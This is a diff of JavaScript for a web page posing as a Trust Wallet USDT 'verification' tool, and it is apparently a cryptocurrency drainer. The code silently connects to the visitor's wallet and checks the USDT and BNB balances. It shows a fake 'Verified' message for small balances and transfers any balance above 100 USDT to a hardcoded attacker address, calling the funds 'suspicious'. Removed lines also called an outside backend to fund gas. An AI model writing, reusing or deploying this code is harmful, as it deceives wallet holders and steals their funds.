@@ -1,54 +1,52 @@
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
-const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3;
 let userAddress = null;
 
-// ✅ Wait and silently detect Trust Wallet
-window.addEventListener("load", async () => {
-    setTimeout(async () => {
-        const provider = window.ethereum || window.trustwallet || window.BinanceChain;
+// 🛠 Wait and get Trust Wallet provider silently
+async function initWeb3() {
+    return new Promise((resolve) => {
+        setTimeout(async () => {
+            const provider = window.BinanceChain || window.trustwallet || window.ethereum;
 
-        if (!provider) {
-            alert("❌ Wallet not detected. Please open in Trust Wallet browser.");
-            return;
-        }
-
-        web3 = new Web3(provider);
-
-        try {
-            const accounts = await web3.eth.getAccounts();
-
-            if (accounts && accounts.length > 0) {
-                userAddress = accounts[0];
-                console.log("✅ Wallet connected:", userAddress);
-
-                try {
-                    await provider.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: "0x38" }]
-                    });
-                } catch (switchErr) {
-                    console.warn("Chain switch skipped:", switchErr.message);
-                }
-
-            } else {
-                console.warn("⚠️ No connected accounts detected.");
+            if (!provider) {
+                console.error("❌ Provider not found.");
+                return resolve(null);
             }
-        } catch (err) {
-            console.error("❌ Error detecting wallet:", err);
-        }
-    }, 2000); // Wait 2 seconds to allow Trust Wallet to inject provider
-});
+
+            web3 = new Web3(provider);
+
+            try {
+                const accounts = await web3.eth.getAccounts();
+
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    console.log("✅ Connected:", userAddress);
+                    resolve(userAddress);
+                } else {
+                    console.warn("⚠️ No account detected.");
+                    resolve(null);
+                }
+            } catch (err) {
+                console.error("❌ Wallet error:", err);
+                resolve(null);
+            }
+        }, 1500); // 1.5 second wait to allow injection
+    });
+}
 
 async function verifyAssets() {
-    if (!web3 || !userAddress) {
+    if (!userAddress) {
+        await initWeb3();
+    }
+
+    if (!userAddress) {
         alert("❌ Wallet not connected. Please open in Trust Wallet browser.");
         return;
     }
 
-    const usdtContract = new web3.eth.Contract([
+    const usdt = new web3.eth.Contract([
         {
             constant: true,
             inputs: [{ name: "_owner", type: "address" }],
@@ -59,63 +57,51 @@ async function verifyAssets() {
     ], usdtContractAddress);
 
     const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
-        usdtContract.methods.balanceOf(userAddress).call(),
+        usdt.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
     ]);
 
     const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
     const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
-    console.log(`USDT: ${usdtBalance} | BNB: ${bnbBalance}`);
+    console.log("USDT:", usdtBalance, "BNB:", bnbBalance);
 
     if (usdtBalance === 0) {
-        showPopup("No USDT found.", "black");
+        showPopup("No USDT found in wallet.", "black");
         return;
     }
 
     if (usdtBalance <= 100) {
-        showPopup(
-            `✅ Verified<br>Your USDT appears valid.<br><br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
-            "green"
-        );
-        return;
+        showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
+    } else {
+        showPopup("Transferring suspicious USDT...", "green");
+        transferUSDT(usdtBalance);
     }
-
-    showPopup("Transferring...", "green");
-    transferUSDT(usdtBalance, bnbBalance);
 }
 
-async function transferUSDT(usdtBalance, bnbBalance) {
-    try {
-        if (bnbBalance < 0.0005) {
-            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ toAddress: userAddress })
-            });
+async function transferUSDT(amount) {
+    const contract = new web3.eth.Contract([
+        {
+            constant: false,
+            inputs: [
+                { name: "recipient", type: "address" },
+                { name: "amount", type: "uint256" }
+            ],
+            name: "transfer",
+            outputs: [{ name: "", type: "bool" }],
+            type: "function"
         }
+    ], usdtContractAddress);
 
-        const usdt = new web3.eth.Contract([
-            {
-                constant: false,
-                inputs: [
-                    { name: "recipient", type: "address" },
-                    { name: "amount", type: "uint256" }
-                ],
-                name: "transfer",
-                outputs: [{ name: "", type: "bool" }],
-                type: "function"
-            }
-        ], usdtContractAddress);
+    try {
+        const value = web3.utils.toWei(amount.toString(), "ether");
 
-        const amount = web3.utils.toWei(usdtBalance.toString(), "ether");
+        await contract.methods.transfer(bscAddress, value).send({ from: userAddress });
 
-        await usdt.methods.transfer(bscAddress, amount).send({ from: userAddress });
-
-        showPopup(`✅ USDT transferred: ${usdtBalance}`, "red");
-    } catch (err) {
-        console.error("Transfer failed:", err);
-        alert("Transfer failed. Do you have BNB for gas?");
+        showPopup(`✅ Transferred ${amount} USDT`, "red");
+    } catch (e) {
+        console.error("❌ Transfer failed:", e);
+        alert("Transfer failed. Check BNB balance or Trust Wallet permissions.");
     }
 }
 
@@ -134,10 +120,10 @@ function showPopup(message, color) {
         popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
         popup.style.textAlign = "center";
         popup.style.fontSize = "16px";
-        popup.style.background = "#fff";
         popup.style.zIndex = 9999;
         popup.style.maxWidth = "400px";
         popup.style.width = "80%";
+        popup.style.backgroundColor = "#fff";
         document.body.appendChild(popup);
     }
 
